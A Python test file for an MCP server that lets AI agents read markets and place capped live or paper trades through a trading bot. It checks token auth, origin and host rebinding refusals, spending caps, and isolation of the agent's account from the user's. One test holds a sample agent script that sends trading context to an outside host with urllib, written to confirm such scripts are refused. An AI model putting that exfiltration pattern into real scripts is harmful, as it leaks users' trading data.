from __future__ import annotations

import asyncio
import json
import sys
import types

import pytest

import db
import mcp_server
import mcp_tools
import terminal_paper as tp
import terminal_trade as tt


def _run(coro):
    return asyncio.new_event_loop().run_until_complete(coro)


def _fake_service(monkeypatch, **cfg):
    mod = types.ModuleType("service")
    events: list = []
    base = {"mcp_enabled": True, "mcp_live_trading_enabled": False,
            "mcp_scripts_enabled": False, "mcp_max_order_usd": 25.0,
            "mcp_daily_limit_usd": 100.0, "terminal_paper_mode": False,
            "mcp_paper_bankroll_usd": 500.0, "terminal_paper_bankroll_usd": 1000.0}
    base.update(cfg)
    mod.STATE = types.SimpleNamespace(cfg=base, auth_ok=True, paused=False)

    async def _emit(name, payload=None):
        events.append((name, payload))
    mod.emit_event = _emit
    mod._sanitize_script_code = lambda c: str(c or "")
    mod._sync_terminal_offline = lambda: None
    monkeypatch.setitem(sys.modules, "service", mod)
    return mod, events


@pytest.fixture
def fresh(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "db_path", lambda: tmp_path / "mcp.db")
    db.init_db()
    mcp_server._sessions.clear()
    return tmp_path


def _session():
    return {"client": "test-agent", "reads": 0, "writes": 0, "refused": 0}


def _call(name, args):
    return _run(mcp_tools.call(name, args, _session()))


def _text(res):
    return res["content"][0]["text"]


def test_initialize_negotiates_a_version_and_opens_a_session(fresh):
    resp, sid = _run(mcp_server.handle_message({
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18",
                   "clientInfo": {"name": "claude-code", "version": "9.9"}}}, None))
    assert resp["result"]["protocolVersion"] == "2025-06-18"
    assert resp["result"]["capabilities"]["tools"] is not None
    assert "conditionId" in resp["result"]["instructions"]
    assert sid and mcp_server._sessions[sid]["client"] == "claude-code"


def test_an_unknown_version_gets_ours_not_an_error(fresh):
    resp, _ = _run(mcp_server.handle_message({
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "1999-01-01"}}, None))
    assert resp["result"]["protocolVersion"] == mcp_server.PROTOCOL_VERSIONS[0]


def test_a_notification_gets_no_response(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "method": "notifications/initialized"}, None))
    assert resp is None


def test_tools_list_is_complete_and_schemas_are_closed(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, None))
    tools = {t["name"]: t for t in resp["result"]["tools"]}
    assert len(tools) <= 40, "some clients only use the first 40 tools"
    for t in tools.values():
        assert t["inputSchema"]["type"] == "object"
        assert t["inputSchema"]["additionalProperties"] is False
        for r in t["inputSchema"]["required"]:
            assert r in t["inputSchema"]["properties"], (t["name"], r)
    assert tools["get_market"]["annotations"]["readOnlyHint"] is True
    assert tools["place_order"]["annotations"]["destructiveHint"] is True


def test_unknown_method_and_unknown_tool_are_errors(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 3, "method": "sampling/createMessage"}, None))
    assert resp["error"]["code"] == -32601
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 4, "method": "tools/call",
         "params": {"name": "drain_wallet", "arguments": {}}}, None))
    assert resp["error"]["code"] == -32602


def test_unknown_arguments_are_refused_not_ignored(fresh, monkeypatch):
    _fake_service(monkeypatch)
    res = _call("get_status", {"bypass_caps": True})
    assert res["isError"] and "unknown argument" in _text(res)


def _req(body=None, **headers):
    h = {"host": "127.0.0.1:47615"}
    h.update({k.replace("_", "-"): v for k, v in headers.items()})
    return {"method": "POST", "path": "/mcp", "headers": h,
            "body": json.dumps(body or {"jsonrpc": "2.0", "id": 1, "method": "ping"}).encode()}


@pytest.fixture
def served(fresh, monkeypatch):
    tok = mcp_server.ensure_token()
    monkeypatch.setattr(mcp_server, "_want", True)
    return tok


def test_a_browser_origin_is_refused_even_with_the_token(served):
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", origin="https://evil.example")))
    assert status == 403


def test_a_rebound_hostname_is_refused(served):
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", host="evil.example:47615")))
    assert status == 403


def test_no_token_or_a_wrong_token_is_401(served):
    assert _run(mcp_server._route(_req()))[0] == 401
    assert _run(mcp_server._route(_req(authorization="Bearer kp_wrong")))[0] == 401


def test_the_right_token_from_loopback_is_served(served):
    status, headers, body = _run(mcp_server._route(_req(authorization=f"Bearer {served}")))
    assert status == 200 and json.loads(body)["result"] == {}
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", host="localhost:47615")))
    assert status == 200


def test_rotating_the_token_locks_out_the_old_one(served):
    new = mcp_server.rotate_token()
    assert new != served
    assert _run(mcp_server._route(_req(authorization=f"Bearer {served}")))[0] == 401
    assert _run(mcp_server._route(_req(authorization=f"Bearer {new}")))[0] == 200


def test_turned_off_means_503_even_for_a_valid_token(served, monkeypatch):
    monkeypatch.setattr(mcp_server, "_want", False)
    assert _run(mcp_server._route(_req(authorization=f"Bearer {served}")))[0] == 503


def test_the_token_is_not_stored_in_plain_sight(served):
    raw = mcp_server._token_path().read_bytes()
    import polymarket_auth as auth
    if not auth._is_plaintext_secret_file(mcp_server._token_path()):
        assert served.encode() not in raw


def test_a_real_socket_round_trip(served):
    import socket

    async def go():
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        await mcp_server.start(port)
        try:
            reader, writer = await asyncio.open_connection("127.0.0.1", port)
            body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                               "params": {"protocolVersion": "2025-06-18",
                                          "clientInfo": {"name": "sock"}}}).encode()
            writer.write(
                (f"POST /mcp HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
                 f"Authorization: Bearer {served}\r\nContent-Type: application/json\r\n"
                 f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
            await writer.drain()
            raw = await reader.read()
            writer.close()
            return raw, port
        finally:
            await mcp_server.stop()

    raw, port = _run(go())
    head, _, body = raw.partition(b"\r\n\r\n")
    assert head.startswith(b"HTTP/1.1 200")
    assert b"Mcp-Session-Id:" in head
    assert json.loads(body)["result"]["serverInfo"]["name"] == "krypt-polybot"
    assert not mcp_server.bridge_path().exists(), "stop() must remove the bridge file"


def _no_venue(monkeypatch):
    sent = []

    async def _place(order, *, origin="manual", standing_id=None):
        sent.append((order, origin))
        return {"ok": True, "orderId": "0xorder", "status": "live", "message": "sent"}
    monkeypatch.setattr(tt, "place", _place)
    return sent


def _priced(monkeypatch, cost):
    async def _preview(req):
        return {"blockers": [], "warnings": [], "costUsd": cost,
                "side": req["side"], "action": req["action"],
                "size": req["size"], "priceCents": req["priceCents"]}
    monkeypatch.setattr(tt, "preview", _preview)


_BUY = {"mode": "live", "conditionId": "0xabc", "side": "yes", "action": "buy",
        "size": 10, "priceCents": 50}


def test_live_is_refused_while_its_switch_is_off(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=False)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    res = _call("place_order", _BUY)
    assert res["isError"] and "OFF" in _text(res)
    assert sent == []
    assert mcp_server.audit_log(1)[0]["outcome"] == "refused"


def test_mode_is_never_defaulted(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True)
    sent = _no_venue(monkeypatch)
    res = _call("place_order", {k: v for k, v in _BUY.items() if k != "mode"})
    assert res["isError"] and sent == []


def test_global_paper_mode_blocks_an_agent_too(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, terminal_paper_mode=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    res = _call("place_order", _BUY)
    assert res["isError"] and "PAPER MODE" in _text(res)
    assert sent == []


def test_a_live_buy_inside_the_caps_is_sent_tagged_ai(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    res = _call("place_order", _BUY)
    assert not res["isError"], _text(res)
    assert len(sent) == 1
    order, origin = sent[0]
    assert origin == "ai", "agent orders must land in their own origin"
    assert order["confirmUsd"] == 5.0


def test_the_per_order_cap(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, mcp_max_order_usd=25.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 30.0)
    res = _call("place_order", _BUY)
    assert res["isError"] and "per-order cap" in _text(res)
    assert sent == []


def test_an_unpriceable_buy_is_refused_because_no_cap_can_hold(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, None)
    res = _call("place_order", _BUY)
    assert res["isError"] and sent == []


def _ai_order(conn, *, size, price, status="placed", action="buy", origin="ai"):
    conn.execute(
        "INSERT INTO terminal_orders (condition_id, side, action, order_type, "
        "requested_size, requested_price_cents, sent_size, sent_price_cents, "
        "status, origin, network) VALUES ('0xabc','yes',?,'GTC',?,?,?,?,?,?,'mainnet')",
        (action, size, price, size, price, status, origin))


def test_spend_today_counts_only_ai_buys_that_could_be_live(fresh):
    with db.get_db() as conn:
        _ai_order(conn, size=100, price=50)
        _ai_order(conn, size=10, price=50, status="error")
        _ai_order(conn, size=100, price=50, status="unmatched")
        _ai_order(conn, size=100, price=50, action="sell")
        _ai_order(conn, size=100, price=50, origin="manual")
    assert mcp_tools.spent_today_usd() == 55.0


def test_the_daily_cap(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, mcp_daily_limit_usd=100.0)
    with db.get_db() as conn:
        _ai_order(conn, size=180, price=50)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 15.0)
    res = _call("place_order", _BUY)
    assert res["isError"] and "daily cap" in _text(res)
    assert sent == []


def test_parallel_buys_cannot_both_slip_under_the_daily_cap(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True,
                  mcp_daily_limit_usd=20.0, mcp_max_order_usd=0.0)
    _priced(monkeypatch, 15.0)
    sent = []

    async def _place(order, *, origin="manual", standing_id=None):
        await asyncio.sleep(0.02)
        with db.get_db() as conn:
            _ai_order(conn, size=30, price=50)
        sent.append(order)
        return {"ok": True, "message": "sent"}
    monkeypatch.setattr(tt, "place", _place)
    mcp_tools._live_lock = asyncio.Lock()

    async def both():
        mcp_tools._live_lock = asyncio.Lock()
        return await asyncio.gather(
            mcp_tools.call("place_order", dict(_BUY), _session()),
            mcp_tools.call("place_order", dict(_BUY), _session()))
    a, b = asyncio.new_event_loop().run_until_complete(both())
    assert len(sent) == 1
    assert sorted([a["isError"], b["isError"]]) == [False, True]


def test_exits_are_not_capped(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, mcp_max_order_usd=1.0,
                  mcp_daily_limit_usd=1.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 500.0)
    res = _call("place_order", {**_BUY, "action": "sell"})
    assert not res["isError"], _text(res)
    assert len(sent) == 1


def test_pausing_is_always_allowed_and_arming_is_not(fresh, monkeypatch):
    svc, events = _fake_service(monkeypatch, mcp_live_trading_enabled=False,
                                enable_trading=True)
    res = _call("pause_all_engines", {})
    assert not res["isError"]
    assert svc.STATE.cfg["enable_trading"] is False
    assert events and events[-1][0] == "mcp:configPatch"

    res = _call("set_engines", {"engines": {"crypto15m": True}})
    assert res["isError"] and "OFF" in _text(res)
    assert not svc.STATE.cfg.get("crypto15m_enabled")

    res = _call("set_engines", {"engines": {"copy_trading": False}})
    assert not res["isError"]


def _perps_service(monkeypatch, **cfg):
    svc, events = _fake_service(monkeypatch, **cfg)
    calls: list = []

    def _h(name, result):
        async def fn(p):
            calls.append((name, p))
            return result
        return fn
    svc._h_perps_board = _h("board", {"ok": True, "markets": [
        {"symbol": "BTC-USD", "category": "crypto", "estRewardUsd": 2.0, "avgDailyVolUsd": 9e6},
        {"symbol": "ETH-USD", "category": "crypto", "estRewardUsd": 9.0, "avgDailyVolUsd": 5e6},
        {"symbol": "SPX", "category": "index", "estRewardUsd": None, "avgDailyVolUsd": 1e7}]})
    svc._h_perps_status = _h("status", {"enabled": False, "markets": []})
    svc._h_perps_backtest = _h("backtest", {"ok": True, "runs": []})
    svc._h_perps_cancel_all = _h("cancel", {"ok": True, "message": "Cancelled 2 quote(s)."})
    svc._h_perps_flatten = _h("flatten", {"ok": True, "message": "closed"})
    svc._h_perps_link = _h("link", {"ok": True, "message": "Perps account linked."})
    svc._h_perps_unlink = _h("unlink", {"ok": True, "message": "Perps account unlinked."})
    return svc, events, calls


def test_perps_reads_need_no_permission(fresh, monkeypatch):
    _svc, _e, calls = _perps_service(monkeypatch, mcp_live_trading_enabled=False)
    res = _call("perps", {"action": "board", "category": "crypto"})
    assert not res["isError"]
    board = json.loads(_text(res))
    assert [m["symbol"] for m in board["markets"]] == ["ETH-USD", "BTC-USD"]
    assert board["marketCount"] == 2

    res = _call("perps", {"action": "board", "sort": "volume", "limit": 1})
    assert [m["symbol"] for m in json.loads(_text(res))["markets"]] == ["SPX"]

    assert not _call("perps", {"action": "status"})["isError"]
    res = _call("perps", {"action": "backtest", "days": 2, "markets": ["BTC-USD"],
                          "grid": {"perpsQuoteBps": [2, 4]}})
    assert not res["isError"]
    assert calls[-1] == ("backtest", {"days": 2, "markets": ["BTC-USD"],
                                      "grid": {"perpsQuoteBps": [2, 4]}})


def test_perps_actions_that_trade_need_live_and_no_paper_mode(fresh, monkeypatch):
    _svc, _e, calls = _perps_service(monkeypatch, mcp_live_trading_enabled=False)
    for act in ("cancel_quotes", "link", "unlink"):
        res = _call("perps", {"action": act})
        assert res["isError"] and "OFF" in _text(res), act
    res = _call("perps", {"action": "flatten", "confirm": True})
    assert res["isError"]
    assert not [c for c in calls if c[0] in ("cancel", "flatten", "link", "unlink")]

    _perps_service(monkeypatch, mcp_live_trading_enabled=True, terminal_paper_mode=True)
    res = _call("perps", {"action": "flatten", "confirm": True})
    assert res["isError"] and "PAPER MODE" in _text(res)

    _svc, _e, calls = _perps_service(monkeypatch, mcp_live_trading_enabled=True)
    assert not _call("perps", {"action": "cancel_quotes"})["isError"]
    assert not _call("perps", {"action": "flatten", "confirm": True})["isError"]
    assert [c[0] for c in calls] == ["cancel", "flatten"]


def test_perps_flatten_without_confirm_only_lists(fresh, monkeypatch):
    import perps_api
    _svc, _e, calls = _perps_service(monkeypatch, mcp_live_trading_enabled=False)
    monkeypatch.setattr(perps_api, "creds", lambda: {"proxy": "0x1"})

    async def _pf(_c):
        return {"positions": [{"instrument_id": 7, "size": "-0.5",
                               "position_value": "50", "unrealized_pnl": "-1"},
                              {"instrument_id": 8, "size": "0"}]}

    async def _inst(force=False):
        return [{"instrument_id": 7, "symbol": "ETH-USD"}]
    monkeypatch.setattr(perps_api, "portfolio", _pf)
    monkeypatch.setattr(perps_api, "instruments", _inst)
    res = _call("perps", {"action": "flatten"})
    assert not res["isError"]
    out = json.loads(_text(res))
    assert out["preview"] and out["positions"] == [
        {"symbol": "ETH-USD", "side": "short", "qty": 0.5, "valueUsd": "50",
         "unrealizedPnlUsd": "-1"}]
    assert not calls


def test_pausing_stops_perps_and_it_cannot_be_armed_in_paper_mode(fresh, monkeypatch):
    svc, _e = _fake_service(monkeypatch, mcp_live_trading_enabled=False, perps_enabled=True)
    assert not _call("pause_all_engines", {})["isError"]
    assert svc.STATE.cfg["perps_enabled"] is False
    status = json.loads(_text(_call("get_status", {})))
    assert status["engines"]["perps"] is False

    svc, _e = _fake_service(monkeypatch, mcp_live_trading_enabled=True,
                            terminal_paper_mode=True)
    res = _call("set_engines", {"engines": {"perps": True}})
    assert res["isError"] and "PAPER MODE" in _text(res)
    res = _call("update_config", {"changes": {"perps_enabled": True}})
    assert res["isError"] and "PAPER MODE" in _text(res)
    assert not svc.STATE.cfg.get("perps_enabled")
    res = _call("update_config", {"changes": {"perps_quote_bps": 4.0}})
    assert not res["isError"]

    svc, _e = _fake_service(monkeypatch, mcp_live_trading_enabled=True)
    assert not _call("set_engines", {"engines": {"perps": True}})["isError"]
    assert svc.STATE.cfg["perps_enabled"] is True


def test_scripts_need_their_own_switch(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_live_trading_enabled=True, mcp_scripts_enabled=False)
    res = _call("save_script", {"code": "def decide(ctx):\n    return None\n"})
    assert res["isError"] and "scripts" in _text(res).lower()
    res = _call("backtest_script", {"code": "def decide(ctx):\n    return None\n"})
    assert res["isError"]


def test_an_agent_script_with_a_critical_finding_is_refused(fresh, monkeypatch):
    svc, _ = _fake_service(monkeypatch, mcp_scripts_enabled=True)
    saved = []

    async def _save(p):
        saved.append(p)
        return {"script": {}}
    svc._h_script_save = _save
    evil = ("import urllib.request\n"
            "def decide(ctx):\n"
            "    urllib.request.urlopen('https://x.example/' + str(ctx))\n")
    res = _call("save_script", {"code": evil})
    assert res["isError"] and "critical" in _text(res)
    assert saved == []


def _mock_book(monkeypatch):
    async def _market(cid, include_raw=False):
        m = {"conditionId": cid, "title": "T", "slug": "t", "category": "crypto",
             "status": "open", "resolvedOutcome": None,
             "closeTime": "2030-01-01T00:00:00Z", "probability": 50.0,
             "_raw": {"orderPriceMinTickSize": 0.01, "orderMinSize": 1,
                      "acceptingOrders": True, "feesEnabled": False}}
        return m if include_raw else {k: v for k, v in m.items() if k != "_raw"}

    async def _book(cid, side="yes"):
        lvl = [{"priceCents": 50.0, "size": 1000.0, "cumulative": 1000.0, "notionalUsd": 500.0}]
        return {"conditionId": cid, "asks": lvl, "bids": [
            {"priceCents": 48.0, "size": 1000.0, "cumulative": 1000.0, "notionalUsd": 480.0}],
            "bestAsk": 50.0, "bestBid": 48.0, "available": True, "note": None}

    async def _summaries(ids):
        return [await _market(i) for i in ids]
    for mod in (tp.term, tt.term):
        monkeypatch.setattr(mod, "market", _market)
        monkeypatch.setattr(mod, "book", _book)
    monkeypatch.setattr(tp.term, "_summaries_for", _summaries)


def test_agent_paper_fills_land_in_its_own_book(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    res = _call("place_order", {**_BUY, "mode": "paper", "orderType": "FAK"})
    assert not res["isError"], _text(res)

    with tp.using_book("ai"):
        ai = _run(tp.portfolio({"mcp_paper_bankroll_usd": 500.0}))
    mine = _run(tp.portfolio({"terminal_paper_bankroll_usd": 1000.0}))
    assert len(ai["positions"]) == 1 and ai["bankrollUsd"] == 500.0
    assert ai["positions"][0]["origin"] == "ai"
    assert mine["positions"] == [], "the agent's paper fill leaked into the user's account"
    assert mine["cashUsd"] == 1000.0


def test_resetting_the_agent_paper_account_spares_the_users(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    _run(tp.place({"conditionId": "0xme", "side": "yes", "action": "buy",
                   "priceCents": 50, "size": 4, "orderType": "FAK"}, {}))
    _call("place_order", {**_BUY, "mode": "paper", "orderType": "FAK"})
    res = _call("reset_paper_account", {})
    assert not res["isError"]
    assert len(tp.orders()["orders"]) == 1, "the user's paper order was wiped"
    with tp.using_book("ai"):
        assert tp.orders()["orders"] == []


def test_an_agent_cannot_cancel_the_users_paper_order(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    r = _run(tp.place({"conditionId": "0xme", "side": "yes", "action": "buy",
                       "priceCents": 10, "size": 4, "orderType": "GTC"}, {}))
    res = _call("cancel_order", {"mode": "paper", "localId": r["localId"]})
    assert res["isError"]
    assert tp.orders()["orders"][0]["status"] == "resting"


def test_the_agent_can_sell_only_what_its_own_book_holds(fresh, monkeypatch):
    _fake_service(monkeypatch)
    _mock_book(monkeypatch)
    _run(tp.place({"conditionId": "0xabc", "side": "yes", "action": "buy",
                   "priceCents": 50, "size": 10, "orderType": "FAK"}, {}))
    res = _call("place_order", {**_BUY, "mode": "paper", "action": "sell",
                                "orderType": "FAK"})
    assert res["isError"] and "hold 0" in _text(res)


def test_relay_lists_tools_and_explains_itself_with_the_app_closed(fresh, monkeypatch):
    import mcp_stdio
    out = []
    monkeypatch.setattr(mcp_stdio, "_send", out.append)
    monkeypatch.setattr(mcp_stdio, "_endpoint", lambda: None)
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                       "params": {"protocolVersion": "2025-06-18",
                                  "clientInfo": {"name": "Claude Desktop"}}})
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 2, "method": "tools/list"})
    mcp_stdio._handle({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                       "params": {"name": "get_status", "arguments": {}}})
    assert out[0]["result"]["serverInfo"]["name"] == "krypt-polybot"
    assert len(out[1]["result"]["tools"]) == len(mcp_tools.list_tools())
    assert out[2]["result"]["isError"] is True
    assert "not reachable" in out[2]["result"]["content"][0]["text"]


def test_relay_entry_point_is_branched_before_stdout_logging():
    from pathlib import Path
    src = (Path(__file__).resolve().parents[1] / "service.py").read_text(encoding="utf-8")
    assert src.index('"--mcp" in sys.argv') < src.index("\n_setup_logging()")
